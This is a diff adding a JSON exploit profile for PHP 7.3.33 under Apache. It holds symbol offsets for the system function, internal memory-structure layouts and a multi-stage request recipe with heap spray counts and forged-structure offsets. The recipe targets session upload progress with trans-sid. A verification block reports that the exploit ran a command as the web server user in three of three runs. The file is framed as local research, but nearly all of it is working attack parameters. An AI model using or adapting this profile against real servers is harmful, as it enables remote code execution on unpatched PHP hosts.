@@ -1,0 +1,234 @@
+{
+  "schema_version": 1,
+  "id": "php-7.3.33-apache-amd64-trans-sid-local",
+  "verification": {
+    "state": "verified",
+    "runs": 3,
+    "proof": "fixed id>/out/p command produced uid/gid 33 in 3/3 fresh-ASLR runs",
+    "verified_at": "2026-10-24T00:00:00+09:00"
+  },
+  "build": {
+    "image": {
+      "repo_digest": "mirror.gcr.io/library/php@sha256:b9872cd287ef72bc17d45d713aa2742f3d3bcf2503fea2506fd93aa94995219f",
+      "image_id": "sha256:35da9118b3c0980fbaf84a4d410653642c9d55fb2f6c40011cc78de303837d64",
+      "platform": "linux/amd64"
+    },
+    "php": {
+      "version": "7.3.33",
+      "sapi": "apache2handler",
+      "zts": false,
+      "debug": false
+    },
+    "libphp": {
+      "path": "/usr/lib/apache2/modules/libphp7.so",
+      "sha256": "9801b6f2e7183c858c98bec90150ce7590f69e1827bb4976725211c7ea451109",
+      "gnu_build_id": "cb5f3581bd8fa554ea126c1b1b58020cfa3e8ebc",
+      "elf_class": 64,
+      "endianness": "little",
+      "machine": "EM_X86_64",
+      "type": "ET_DYN"
+    }
+  },
+  "symbols": {
+    "zif_system": {
+      "name": "zif_system",
+      "offset": "0x35f640"
+    },
+    "zval_ptr_dtor": {
+      "name": "zval_ptr_dtor",
+      "offset": "0x440dc0"
+    }
+  },
+  "abi": {
+    "pointer_size": 8,
+    "page_size": "0x1000",
+    "zend_mm_chunk_size": "0x200000",
+    "zend_string": {
+      "size_before_val": "0x18",
+      "len": "0x10",
+      "val": "0x18"
+    },
+    "zval": {
+      "size": "0x10",
+      "value": "0x0",
+      "type_info": "0x8"
+    },
+    "zend_reference": {
+      "size": "0x20",
+      "gc": "0x0",
+      "val": "0x8",
+      "sources": "0x18"
+    },
+    "zend_array": {
+      "size": "0x38",
+      "gc": "0x0",
+      "flags": "0x8",
+      "table_mask": "0xc",
+      "ar_data": "0x10",
+      "num_used": "0x18",
+      "num_elements": "0x1c",
+      "table_size": "0x20",
+      "internal_pointer": "0x24",
+      "next_free": "0x28",
+      "destructor": "0x30"
+    },
+    "zend_execute_data": {
+      "size": "0x50",
+      "opline": "0x0",
+      "call": "0x8",
+      "return_value": "0x10",
+      "func": "0x18",
+      "this": "0x20",
+      "num_args": "0x2c",
+      "prev": "0x30",
+      "symbol_table": "0x38",
+      "call_info": "0x40",
+      "arg1": "0x50"
+    },
+    "types": {
+      "is_string": "0x6",
+      "is_array": "0x7",
+      "is_reference": "0xa",
+      "gc_string": "0x106",
+      "array_ex": "0x307"
+    }
+  },
+  "runtime": {
+    "mpm": "prefork",
+    "workers": 1,
+    "memory_limit": "108M",
+    "post_max_size": "192M",
+    "upload_max_filesize": "192M",
+    "max_input_vars": 1000,
+    "display_errors": false,
+    "file_uploads": true,
+    "session_extension": true,
+    "upload_progress_enabled": true,
+    "session_use_trans_sid": true,
+    "session_use_cookies": false,
+    "session_use_only_cookies": false,
+    "upload_progress_cleanup": true,
+    "url_rewriter_tags": "a=href,area=href,frame=src,form=",
+    "session_name": "PHPSESSID",
+    "upload_progress_name": "PHP_SESSION_UPLOAD_PROGRESS"
+  },
+  "request_recipe": {
+    "strategy": "php81-trans-sid-v1",
+    "query_fields": 5,
+    "a1": {
+      "boundary_len": 10,
+      "nested_parts": 860,
+      "depth": 64,
+      "key_pad": 90,
+      "ctype_lengths": [
+        103,
+        231
+      ],
+      "small_fillers": {
+        "count": 14,
+        "name_len": 103,
+        "value_len": 8
+      },
+      "large_fields": {
+        "count": 65,
+        "value_len": 8000
+      },
+      "burners": {
+        "count": 20,
+        "value_len": 4000
+      },
+      "pad": {
+        "name_len": 5,
+        "value_len": 1216
+      },
+      "progress_len": 4000,
+      "pre_file_scalars": [
+        {
+          "count": 4,
+          "name_len": 8,
+          "value_len": 3000,
+          "prefix": "s",
+          "fill": "V"
+        },
+        {
+          "count": 1,
+          "name_len": 8,
+          "value_len": 850,
+          "prefix": "r",
+          "fill": "R"
+        },
+        {
+          "count": 12,
+          "name_len": 8,
+          "value_len": 128,
+          "prefix": "e",
+          "fill": "E"
+        }
+      ],
+      "pre_file_mix": [
+        170,
+        400
+      ],
+      "file": {
+        "name_len": 3064,
+        "filename_len": 245760,
+        "content_type_len": 24,
+        "value_len": 1
+      }
+    },
+    "b1": {
+      "boundary_len": 10,
+      "target_offset": "0x126260",
+      "fake_len": "0x400000",
+      "allocator_overhead": 25,
+      "value_data_offset": 4120,
+      "name_len": 120,
+      "head_forged_fields": 13,
+      "forged_pages": 294,
+      "partial_flood_pages": 400,
+      "tail_forged_fields": 2,
+      "hit_index": 12,
+      "nested_fillers": 900,
+      "expected_prefix": "/12BBBBB",
+      "main_qword_offset": "0xd9d88",
+      "min_dtor_hits": 100,
+      "libphp_delta_min": "0x200000",
+      "libphp_delta_max": "0x1000000"
+    },
+    "a2": {
+      "boundary_len": 17,
+      "session_value_len": 19,
+      "progress_value": "pwn",
+      "fillers": {
+        "count": 64,
+        "name_len": 7,
+        "value_len": 7
+      },
+      "file": {
+        "name": "f",
+        "filename": "a.txt",
+        "value_len": 64
+      },
+      "large_field": {
+        "name": "big",
+        "value_len": 167772160,
+        "stream_chunk": 65536
+      }
+    },
+    "b2": {
+      "boundary_len": 10,
+      "session_value": "a",
+      "progress_value": "pwn",
+      "spray_count": 400,
+      "name_len": 4,
+      "value_len": 4071,
+      "reference_offset": "0x6b030",
+      "fake_array_offset": "0x6b200",
+      "refcount": 1
+    }
+  },
+  "provenance": {
+    "source": "local-docker-php73-http-research",
+    "notes": "Development profile for one immutable PHP 7.3.33 Apache image on an internal Docker network; fixed id>/out/p proof only."
+  }
+}
